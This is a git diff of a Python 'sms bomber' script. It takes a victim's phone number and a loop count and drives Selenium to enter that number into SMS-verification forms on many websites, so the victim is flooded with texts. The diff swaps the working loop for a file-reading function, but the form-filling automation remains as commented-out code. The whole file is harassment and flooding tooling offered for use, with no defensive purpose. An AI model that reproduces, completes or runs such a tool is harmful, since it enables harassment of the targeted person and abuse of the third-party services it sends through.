@@ -5,56 +5,51 @@ from selenium.webdriver.common.keys import Keys
 import time
 import random
 import pyfiglet
-
-pyfiglet.print_figlet("sms bomber 2")
+import os
 
 
 def collect_info():
     init_info = {'phone_num': int(input('Enter phone number:')),
                  'loops': int(input('Enter number of loops (loops mean how many sms w'
                                     'ill be sent from the same service):'))}
-    print("Good, working!")
+    print("Good, We are working!")
     return init_info
 
 
-def open_one_field_txt():
-    with open("dictionary/raw_one_field.txt", 'r') as one_field:
-        content = []
-        for field in one_field:
-            content.append({"url": field.split()[0], "xpath": field.split()[1]})
-        return content
+def collect_sites_with_elements():
+    sites = []
+    for file in os.listdir('dictionary'):
+        if file.endswith('.txt'):
+            sites.append(file)
 
+    sites_with_elements = []
 
-# function use pages with one field (phone number field only)
-# loops mean how many sms will be sent from the same service
-def render_one_field_page(phone_number, loops):
-
-    content = open_one_field_txt()
-
-    for i in range(loops):
-
-        for item in content:
-            # 'webdrivers' folder should contain the same chrome driver version as your chrome browser version
-            service = Service(executable_path="webdrivers/chromedriver.exe")
-            browser = webdriver.Chrome(service=service)
-
-            browser.get(item["url"])
-            time.sleep(random.randint(2, 5))
-            field_on_page = browser.find_element(By.XPATH, value=item['xpath'])
-            # sometime need to focus on element .click()
-            field_on_page.click()
-            field_on_page.clear()
-            field_on_page.send_keys(phone_number)
-            time.sleep(1)
-            field_on_page.send_keys(Keys.ENTER)
-            time.sleep(random.randint(2, 5))
-            input()
-            browser.close()
-            browser.quit()
-
-    print("Everything was done!")
+    for site in sites:
+        with open(f'dictionary/{site}') as temp_file:
+            elements_list = []
+            for element in temp_file:
+                elements_list.append(element)
+            sites_with_elements.append({'site': site, "items": elements_list})
+    return sites_with_elements
 
 
 if __name__ == "__main__":
-    info = collect_info()
-    render_one_field_page(info['phone_num'], info['loops'])
+    print(collect_sites_with_elements())
+
+#            'webdrivers' folder should contain the same chrome driver version as your chrome browser version
+#             service = Service(executable_path="webdrivers/chromedriver.exe")
+#             browser = webdriver.Chrome(service=service)
+#
+#             browser.get(item["url"])
+#             time.sleep(random.randint(2, 5))
+#             field_on_page = browser.find_element(By.XPATH, value=item['xpath'])
+#             # sometime need to focus on element .click()
+#             field_on_page.click()
+#             field_on_page.clear()
+#             field_on_page.send_keys(phone_number)
+#             time.sleep(1)
+#             field_on_page.send_keys(Keys.ENTER)
+#             time.sleep(random.randint(2, 5))
+#             input()
+#             browser.close()
+#             browser.quit()
